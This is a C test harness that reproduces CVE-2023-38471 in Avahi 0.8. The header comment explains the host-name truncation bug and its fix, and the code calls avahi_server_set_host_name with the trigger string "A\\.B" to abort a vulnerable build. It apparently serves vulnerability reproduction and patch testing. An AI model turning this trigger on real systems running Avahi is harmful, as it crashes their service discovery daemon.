/**
 * Real CVE-2023-38471 - actual vulnerable Avahi v0.8 (libavahi-core) + ASan/UBSan
 *
 * Reachable assertion / invalid-escape crash (CWE-617) in
 * avahi_server_set_host_name() (avahi-core/server.c):
 *
 *     hn[strcspn(hn, ".")] = 0;     // splits on the FIRST dot, even an
 *                                   // ESCAPED one ("\."), producing a
 *                                   // truncated, invalid escape sequence
 *     ... avahi_domain_equal(s->host_name, hn) ...   // asserts on invalid name
 *
 * For host name "A\.B" (literal: A backslash dot B, a single valid label whose
 * dot is escaped) the v0.8 code naively truncates at the byte offset of the
 * dot, yielding the dangling escape "A\" and then crashes in the domain
 * comparison / validity path.
 *
 * The fix (commit 894f085f402e023a98cbb6f5a3d117bd88d93b09, "core: extract host
 * name using avahi_unescape_label()") unescapes the first label properly and
 * returns AVAHI_ERR_INVALID_HOST_NAME instead of crashing.
 *
 * TRANSPORT: avahi_server_set_host_name() is the function behind the D-Bus
 * method org.freedesktop.Avahi.Server2.SetHostName("s", "A\.B") -- locally
 * reachable (the published busctl reproducer). It is NOT directly driven by a
 * raw mDNS 5353 packet; honest label = D-Bus / local, not network-mDNS.
 * This harness drives the genuine public API function with the published
 * reproducer string.
 *
 * Crash class: reachable assert (CWE-617) -> abort, geometry-independent.
 * Built against ASan-instrumented libavahi-core so the trace reaches logs.
 *
 * Real CVE: https://nvd.nist.gov/vuln/detail/CVE-2023-38471
 * Affected: avahi <= 0.8 (fixed in 0.9). Reproducer: SetHostName("A\.B")
 *
 * FOR SECURITY TESTING PURPOSES ONLY - DO NOT USE IN PRODUCTION
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#include <avahi-core/core.h>
#include <avahi-common/simple-watch.h>
#include <avahi-common/malloc.h>
#include <avahi-common/error.h>

static AvahiSimplePoll *simple_poll = NULL;

static void server_callback(AvahiServer *s, AvahiServerState state, void *userdata) {
    (void) userdata;
    fprintf(stderr, "[*] server state=%d\n", state);

    if (state == AVAHI_SERVER_RUNNING) {
        int ret;
        fprintf(stderr, "[*] server running, calling avahi_server_set_host_name(\"A\\\\.B\")...\n");
        /* Genuine vulnerable v0.8 code path (same function the D-Bus SetHostName
         * handler calls). The "hn[strcspn(hn, \".\")] = 0" truncation mangles
         * the escaped dot and crashes in the validity/domain-equal path. */
        ret = avahi_server_set_host_name(s, "A\\.B");
        /* Not reached on a vulnerable build. */
        fprintf(stderr, "[*] set_host_name ret=%d (%s) -- NOT vulnerable / patched\n",
                ret, avahi_strerror(ret));
    }
}

static void sigterm(int sig) {
    (void) sig;
    if (simple_poll) avahi_simple_poll_quit(simple_poll);
}

int main(void) {
    AvahiServerConfig config;
    AvahiServer *server = NULL;
    int error;

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    signal(SIGTERM, sigterm);
    signal(SIGINT, sigterm);

    printf("===========================================\n");
    printf("  REAL Avahi CVE-2023-38471 (libavahi-core v0.8)\n");
    printf("  invalid-escape crash in avahi_server_set_host_name\n");
    printf("  (avahi-core/server.c)\n");
    printf("  Trigger: SetHostName(\"A\\\\.B\")\n");
    printf("  Transport: D-Bus SetHostName (local, not raw mDNS)\n");
    printf("  FOR SECURITY TESTING ONLY\n");
    printf("===========================================\n");

    if (!(simple_poll = avahi_simple_poll_new())) {
        fprintf(stderr, "avahi_simple_poll_new failed\n");
        return 1;
    }

    avahi_server_config_init(&config);
    config.publish_hinfo = 0;
    config.publish_addresses = 1;
    config.publish_workstation = 0;
    config.use_ipv6 = 0;
    config.host_name = avahi_strdup("oida-mdns-vuln");

    server = avahi_server_new(avahi_simple_poll_get(simple_poll),
                              &config, server_callback, NULL, &error);
    avahi_server_config_free(&config);

    if (!server) {
        fprintf(stderr, "avahi_server_new failed: %s\n", avahi_strerror(error));
        avahi_simple_poll_free(simple_poll);
        return 1;
    }

    printf("[*] entering event loop on UDP 5353...\n");
    avahi_simple_poll_loop(simple_poll);

    if (server) avahi_server_free(server);
    if (simple_poll) avahi_simple_poll_free(simple_poll);
    return 0;
}
